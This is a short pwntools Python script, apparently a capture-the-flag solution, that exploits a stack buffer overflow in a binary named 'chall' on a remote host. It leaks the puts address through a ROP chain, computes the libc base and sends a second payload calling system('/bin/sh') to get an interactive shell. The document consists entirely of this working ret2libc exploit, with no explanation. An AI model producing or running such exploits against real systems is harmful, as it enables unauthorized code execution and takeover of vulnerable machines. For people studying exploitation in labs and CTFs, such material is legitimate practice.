from pwn import *

context.binary = elf = ELF("./chall")
libc = ELF("./libc.so.6")

p = remote("134.112.58.12",10012)

offset = 88
pop_rdi = 0x4011be
ret     = 0x40101a
p.recvuntil(b"Speak: ")

payload1 = flat(
    b"A" * offset,
    pop_rdi,
    elf.got["puts"],
    elf.plt["puts"],
    elf.sym["main"]
)

p.sendline(payload1)
leaked_puts = u64(
    p.recvline().rstrip(b"\n").ljust(8, b"\x00")
)

libc.address = leaked_puts - libc.sym.puts
system = libc.sym.system
binsh = next(libc.search(b"/bin/sh"))
p.recvuntil(b"Speak: ")

payload2 = flat(
    b"A" * offset,
    ret,
    pop_rdi,
    binsh,
    system
)

p.sendline(payload2)

p.interactive()